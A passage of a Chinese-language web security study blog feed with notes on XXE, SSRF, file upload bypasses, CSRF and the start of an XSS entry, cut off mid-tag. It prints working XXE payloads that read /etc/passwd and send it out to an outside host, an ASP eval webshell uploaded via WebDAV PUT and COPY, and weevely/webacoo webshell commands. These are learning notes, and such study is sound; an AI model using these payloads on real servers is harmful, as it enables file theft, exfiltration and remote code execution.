        <content type="html"><![CDATA[<p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p><a id="more"></a><h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><h3 id="xml介绍"><a href="#xml介绍" class="headerlink" title="xml介绍"></a>xml介绍</h3><p>XML 被设计用来传输和存储数据。XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。XML 允许创作者定义自己的标签和自己的文档结构。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h3><p>1、所有的 XML 元素都必须有一个关闭标签</p><p>2、XML 标签对大小写敏感</p><p>3、XML 必须正确嵌套</p><p>4、XML 属性值必须加引号</p><p>5、实体引用</p><p>6、在 XML 中，空格会被保留</p><h3 id="XML元素介绍"><a href="#XML元素介绍" class="headerlink" title="XML元素介绍"></a>XML元素介绍</h3><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分</p><p><strong>注意</strong><br>XML 文档必须有一个根元素</p><h3 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h3><p>拥有正确语法的 XML 被称为”形式良好”的 XML。通过 DTD 验证的XML是”合法”的 XML。</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><h3 id="DTD声明类型"><a href="#DTD声明类型" class="headerlink" title="DTD声明类型"></a>DTD声明类型</h3><p>内部的 DOCTYPE 声明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt; </span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt; </span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt; </span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt; </span><br><span class="line">&lt;message&gt;Don&#39;t forget me this weekend!&lt;&#x2F;message&gt; </span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><p>外部文档声明：假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>xml文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"note.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>note.dtd</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h3 id="DTD数据类型"><a href="#DTD数据类型" class="headerlink" title="DTD数据类型"></a>DTD数据类型</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p><h3 id="DTD实体介绍"><a href="#DTD实体介绍" class="headerlink" title="DTD实体介绍"></a>DTD实体介绍</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="助于理解"><a href="#助于理解" class="headerlink" title="助于理解"></a>助于理解</h3><p><strong>简单xxe漏洞代码编写</strong></p><p><code>file_get_contents()</code> 函数把整个文件读入一个字符串中。</p><p><code>php://input</code> 是个可以访问请求的原始数据的只读流。</p><p><code>php</code>中的<code>simplexml_load_string</code>函数将xml格式字符串转换为对应的<code>SimpleXMLElement</code></p><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$data = simplexml_load_string($xml) ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span> ;</span><br><span class="line">print_r($data) ;<span class="comment">//注释掉该语句即为无回显的情况</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><p>有回显的XXE利用payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure><p>读取PHP文件</p><p>直接利用file协议读取PHP文件会出现错误，那么需要使用base64编码来进行读取。</p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.php</span><br><span class="line">&quot; &gt;]&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure><p>无显</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.127.140/test.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;e1;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#39;HTTP:&#x2F;&#x2F;192.168.127.140&#x2F;test.php?con&#x3D;%p1;&#39;&gt;&quot;&gt;%p2;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞笔记</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/SSRF%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/SSRF%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>SSRF（server-site request forery，服务端请求伪造）是一种构造请求，由服务端发起请求的安全漏洞。</p><a id="more"></a><p>一般情况下，SSRF的目标就是与外部隔离的内网资源。</p><p><strong>SSRF漏洞原理</strong></p><p>服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤与限制</p><p>主要方式：</p><p>1、对外网、服务器所在内网、本地进行端口扫描，获取Banner信息。</p><p>2、测试运行在内网或本地的应用程序。</p><p>3、利用file协议读取本地文件等。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞笔记</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>upload-libs通关笔记</p><a id="more"></a><h2 id="绕过js验证"><a href="#绕过js验证" class="headerlink" title="绕过js验证"></a>绕过js验证</h2><ul><li>浏览器去掉上传区的form表单中的<code>onsubmit=&quot;return checkFile()&quot;</code>，保存至本地，添加action=”目标网址”，成功上传。</li></ul><p><img src="upload_02.png" alt=""></p><p><img src="upload_01.png" alt=""></p><ul><li>burpsuite去掉js过滤，Proxy–Options–Remove JavaScript form validation,勾选</li></ul><p>burp会自动去掉js验证。</p><h2 id="绕过mime-type验证"><a href="#绕过mime-type验证" class="headerlink" title="绕过mime-type验证"></a>绕过mime-type验证</h2><p>mime-type 介绍：</p><p>mime（multiprupose Internet Mail Extensions）多用途互联网邮件扩展类型</p><p>burp修改mime-type验证：截取，<code>Content-Type: application/octet-stream</code>中的<code>application/octet-stream</code>改为允许mime-type 如：<code>image/jpeg</code>，成功上传。</p><h2 id="绕过黑名单验证"><a href="#绕过黑名单验证" class="headerlink" title="绕过黑名单验证"></a>绕过黑名单验证</h2><h3 id="绕过后缀名"><a href="#绕过后缀名" class="headerlink" title="绕过后缀名"></a>绕过后缀名</h3><p>黑名单不完善，有遗漏的后缀名。</p><p>burp抓取，send to Intruder , Positions中修改自定义位置，Payloads中Payload Options [Simple list]</p><p> load,选择字典文件，字典中包含后缀名，start attack,右键show response to Browser,跳转后，复制图片链接，菜刀连接。</p><h3 id="htaccess文件绕过（探针未成功显示）"><a href="#htaccess文件绕过（探针未成功显示）" class="headerlink" title=".htaccess文件绕过（探针未成功显示）"></a>.htaccess文件绕过（探针未成功显示）</h3><p>黑名单不完善，没有对.htaccess过滤。</p><p>目标站点http.conf中设置 AllowOverride，设置为all（非None）</p><p>.htaccess后缀没有被过滤，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>其中.htaccess文件内容：</p><p><code>SetHandler application/x-httpd-php</code></p><p>设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。</p><p>制作图片phpinfo()探针并上传</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>Windows下是不区分大小写的。</p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>win，php7.1.9nts,以下版本才有。burp抓包，后缀名后加空格。</p><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><p>适用于windows，在Windows下，文件后缀名最后的点会被自动剔除。（php7.1.9nts以下版本）</p><h3 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h3><p>原理：win 下上传的文件后缀名带有<code>::$DATA</code>(ads,ntfs),若没有过滤，上传后可以被去掉，之后执行</p><p>例如：1.php::$DATA,上传后为1.php</p><h3 id="路径拼接绕过"><a href="#路径拼接绕过" class="headerlink" title="路径拼接绕过"></a>路径拼接绕过</h3><p>原理：点过滤是过滤坐后面的那个点</p><p>例如：<code>1.php. .</code>    坐后面的点会被去掉，空格也会被I去掉，过滤为：<code>1.php.</code>    上传后为<code>1.php</code></p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>原理：str_ireplace()函数只替换一次（不区分大小写），并且替换为空。</p><h3 id="0x00绕过"><a href="#0x00绕过" class="headerlink" title="0x00绕过"></a>0x00绕过</h3><p>原理：0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</p><blockquote><p>限制条件</p><p>在PHP5.3之后的版本中完全修复了00截断。并且00截断受限与GPC，addslashes函数。</p></blockquote><p>get型，修改burp抓取的包。</p><p>post型，hex中修改 空格为20，0为00。</p><h3 id="图片webshell绕过"><a href="#图片webshell绕过" class="headerlink" title="图片webshell绕过"></a>图片webshell绕过</h3><p>上传图片webshell：</p><p>gif98a 加上php代码</p><p>文件包含漏洞：</p><p>利用包含文件上传漏洞的页面触发webshell</p><h3 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h3><p>在删除之前，执行其他操作，之后在被删除。</p><h3 id="中间件解析漏洞-iis6-0"><a href="#中间件解析漏洞-iis6-0" class="headerlink" title="中间件解析漏洞-iis6.0"></a>中间件解析漏洞-iis6.0</h3><blockquote><p>限制条件：<br>开启web dav,写入</p></blockquote><p>工具探测：</p><p>iis put scaner 和iis write</p><p>(1) 当建立 <em>.asa、</em>.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件解析。 &lt;%=NOW()%&gt;<br>(2) 当文件 *.asp;1.jpg IIS6.0同样会将文件作为asp文件解析。</p><p>微软 目前也没有推出补丁，不认为是一个漏洞。</p><p><strong>IIS6.0 PUT上传原理</strong></p><p>WebDAV 基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE方法。</p><ol><li><p>探测是否存在IIS PUT漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS &#x2F; HTTP1.1</span><br><span class="line">Host: www.xxx.com</span><br></pre></td></tr></table></figure></li><li><p>上传txt文本文件</p></li></ol>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;a.txt HTTP1.1</span><br><span class="line">Host：www.xxx.com</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;chopper&quot;)%&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>通过Move或Copy重名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COPY &#x2F;a.txt HTTP1.1</span><br><span class="line">Host: www.xxx.com</span><br><span class="line">Destination: http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp</span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE &#x2F;a.txt HTTP1.1</span><br><span class="line">Host: www.xxx.com</span><br></pre></td></tr></table></figure></li></ol><p><strong>IIS6.0 PUT上传探测</strong></p><p>利用nikto探测 （kali）<br>nikto -h IP地址</p><p><strong>IIS6.0 PUT上传利用</strong></p><p>利用Burpsuite 进行IIS PUT漏洞利用。先OPTIONS探测、PUT 、MOVE、DELETE,最后菜刀连接</p><p><strong>IIS6.0解析文件类型</strong></p><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :（配置处还可自定义）</p><p>/test.asa<br>/test.cer<br>/test.cdx</p><p><strong>IIS6.0文件解析漏洞修复方案</strong></p><ol><li>目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。</li><li>做好权限设置，限制用户创建文件夹。</li></ol><h2 id="生成-webshell-kali-工具"><a href="#生成-webshell-kali-工具" class="headerlink" title="生成 webshell kali 工具"></a>生成 webshell kali 工具</h2><p>webacoo </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o webshell.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u path</span><br></pre></td></tr></table></figure><p>weevely</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate 123456 &#x2F;root&#x2F;webshell.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely path 123456</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/CSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/CSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>CSRF（Cross-site request forery,跨站请求伪造）也被称为One Click Attack或者Session Riding ,通常缩写为CSRF或者XSRF</p><a id="more"></a><p>csrf本质原因：重要操作的所有参数都是被被恶意攻击者猜测到的。</p><p>原理：利用目标用户的合法身份，忽悠目标用户点击链接，完成某些非法操作</p><p>典型例子：QQ空间自动转发说说</p><p>防御：</p><p>验证http referer字段</p><p>在请求地址中添加token，并验证</p><p>在http头中自定属性并验证</p><h2 id="无防护的csrf漏洞"><a href="#无防护的csrf漏洞" class="headerlink" title="无防护的csrf漏洞"></a>无防护的csrf漏洞</h2><p>get型csrf利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://target.php?uname=123 passworld=123"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>postcsrf利用：设置form表单提交</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"1111"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="自动化探测"><a href="#自动化探测" class="headerlink" title="自动化探测"></a>自动化探测</h2><h3 id="burp探测"><a href="#burp探测" class="headerlink" title="burp探测"></a>burp探测</h3><p>特征：</p><p>重放请求，无一次性token或验证码</p><p>referer去掉后重放请求，无referer验证</p><p>去掉token后重放，后端认证机制薄弱</p><h3 id="CSRFTester探测"><a href="#CSRFTester探测" class="headerlink" title="CSRFTester探测"></a>CSRFTester探测</h3><p>代理抓取链接和表单信息通过在工具中修改，再重新提交，如果测试的请求被网站服务器所接受，那么存在csrf漏洞。</p><p>步骤：</p><p>1.设置浏览器代理:127.0.0.1:8008</p><p>2.登录web应用程序，提交表单，在csrf工具中修改表单内容，查看是否更改，如更改表面存在csrf漏洞。</p><p>3.生产poc（观点验证程序）代码。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞实质是服务器无法判断当前请求是否是合法账户的自定义请求。</p><p>使用服务器搭建csrf poc访问页面，在kali中,/var/www/html,下的index.html要被替换为工具生成的index.html（或者用一个站点的页面嵌入poc代码） ，修改一下ip,类似下面这句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"form10"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:80/espcms/espcms_admin/index.php?act=tExyZnjRRCSmgu2bgcaOZesWvaDlNc6yRugESP1ac3Y="</span>&gt;</span></span><br></pre></td></tr></table></figure><p>127.0.0.1改为目标站点地址，在合法用户登录后并点击了该链接，即可达成攻击目的。</p><h2 id="token防御"><a href="#token防御" class="headerlink" title="token防御"></a>token防御</h2><p>用户登录后，服务器会发给用户一个唯一的合法令牌，会随用户form表单中的value隐藏提交。</p><p>登录验证成功后，再会话session[“user_token”]中保存token。</p><p>在后台操作中，增删改表单中添加隐藏域hidden，设置value为token。</p><p>提交之后进行验证token是否正确。</p><p><strong>防御措施</strong></p><p>生成一个随机且不被轻易猜测的参数。</p><p><strong>token泄露</strong></p><p>get型token泄露：页面包含 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么请求中的referer就会携带对应的get token.</p><p>post型token泄露：</p><p>利用xss漏洞读取cookie,获取讯处在其中的token值。</p><h2 id="referer防御"><a href="#referer防御" class="headerlink" title="referer防御"></a>referer防御</h2><p>referer用来告诉服务器该请求来自哪个页面。</p><p>代码编写：<br>绕过技巧：创建一个带目标服务器的ip的目录<br>burp自动生成poc:pro</p><h2 id="get型利用"><a href="#get型利用" class="headerlink" title="get型利用"></a>get型利用</h2><p>链接利用：a</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p>iframe利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>img标签利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css中background利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"background:url()"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="验证码防御"><a href="#验证码防御" class="headerlink" title="验证码防御"></a>验证码防御</h2><p>并不能每部 都用验证码，并不是主要防御方法。</p><h2 id="referer-check防御"><a href="#referer-check防御" class="headerlink" title="referer check防御"></a>referer check防御</h2><p>主要用于防止盗链，同理也可以用于检查请求是否来自合法的源</p><p>缺陷：不是任何时候都会携带referer头，如https转http</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss跨站脚本攻击</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>xss学习记录</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>又称非持久性XSS，具有一次性。<br>攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。<br>攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。<br>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。</p><h2 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h2><h3 id="cookie介绍"><a href="#cookie介绍" 